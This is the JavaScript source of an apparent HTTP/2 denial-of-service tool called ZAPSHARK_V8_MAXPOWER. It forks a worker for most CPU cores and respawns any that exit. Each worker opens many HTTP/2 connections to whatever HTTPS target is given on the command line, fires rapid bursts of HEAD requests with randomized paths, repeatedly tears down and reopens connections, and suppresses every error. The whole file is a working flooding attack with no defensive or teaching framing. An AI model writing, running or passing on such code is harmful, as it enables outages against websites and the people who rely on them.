const http2 = require('http2');
const cluster = require('cluster');
const os = require('os');

if (cluster.isMaster) {
    const numCPUs = Math.max(1, os.cpus().length - 2);
    
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker) => {
        cluster.fork();
    });
    
} else {
    class ZAPSHARK_V8_MAXPOWER {
        constructor(targetUrl) {
            this.targetUrl = targetUrl;
            this.hostname = new URL(targetUrl).hostname;
            this.totalRequests = 0;
            
            // ADJUSTED FOR MULTI-CORE
            this.clientCount = 5; // PER WORKER
            this.clients = [];
            this.activeStreams = 0;
            this.requestMap = new Map();
            this.lastCleanup = Date.now();
            
            this.attackInterval = null;
            this.resetIntervalObj = null;
        }

        initializeConnections() {
            for (let i = 0; i < this.clientCount; i++) {
                try {
                    const client = http2.connect(this.targetUrl);
                    client.setMaxListeners(1000);
                    client.on('error', () => {});
                    this.clients.push(client);
                } catch (err) {}
            }
        }

        createClient() {
            try {
                const client = http2.connect(this.targetUrl);
                client.setMaxListeners(1000);
                client.on('error', () => {});
                return client;
            } catch (err) {
                return null;
            }
        }

        performExtremeReset() {
            if (this.clients.length > 0) {
                const clientIndex = Math.floor(Math.random() * this.clients.length);
                const client = this.clients[clientIndex];
                
                if (client) {
                    try {
                        client.destroy();
                        const newClient = this.createClient();
                        if (newClient) {
                            this.clients[clientIndex] = newClient;
                        }
                    } catch (err) {}
                }
            }
        }

        cleanupStaleRequests() {
            const now = Date.now();
            if (now - this.lastCleanup > 5000) {
                for (const [reqId, timestamp] of this.requestMap.entries()) {
                    if (now - timestamp > 10000) {
                        this.requestMap.delete(reqId);
                    }
                }
                this.lastCleanup = now;
            }
        }

        sendMaxRequests() {
            if (this.clients.length === 0) return;
            
            this.cleanupStaleRequests();
            
            const streamsThisTick = 20;
            
            for (let i = 0; i < streamsThisTick; i++) {
                const client = this.clients[Math.floor(Math.random() * this.clients.length)];
                if (!client) continue;

                try {
                    this.activeStreams++;
                    const reqId = Math.random().toString(36);
                    this.requestMap.set(reqId, Date.now());
                    
                    const req = client.request({
                        ':method': 'HEAD',
                        ':path': '/?' + Date.now() + Math.random().toString(36).substr(2, 5)
                    });
                    
                    const cleanup = () => {
                        this.activeStreams--;
                        this.totalRequests++;
                        this.requestMap.delete(reqId);
                        req.removeAllListeners();
                    };
                    
                    req.once('response', () => {
                        req.destroy();
                        cleanup();
                    });
                    
                    req.once('error', () => {
                        req.destroy();
                        cleanup();
                    });
                    
                    req.once('close', cleanup);
                    
                    req.end();
                    
                } catch (err) {
                    this.activeStreams--;
                    this.totalRequests++;
                }
            }
        }

        updateDisplay() {
            process.stdout.write(`\rSHARK-TRS — ${this.totalRequests}`);
        }

        start() {
            this.initializeConnections();
            
            setTimeout(() => {
                this.resetIntervalObj = setInterval(() => {
                    this.performExtremeReset();
                }, 0.5);
                
                this.attackInterval = setInterval(() => {
                    for (let batch = 0; batch < 3; batch++) {
                        this.sendMaxRequests();
                    }
                    this.updateDisplay();
                }, 0.1);
                
                setInterval(() => {
                    if (global.gc) global.gc();
                }, 30000);
                
            }, 2000);
            
            process.on('SIGINT', () => {
                clearInterval(this.attackInterval);
                clearInterval(this.resetIntervalObj);
                this.clients.forEach(client => {
                    try { client.destroy(); } catch (e) {}
                });
                this.requestMap.clear();
                process.exit(0);
            });
        }
    }

    const target = process.argv[2];
    if (!target || !target.startsWith('https://')) {
        process.exit(1);
    }

    const shark = new ZAPSHARK_V8_MAXPOWER(target);
    shark.start();
        }
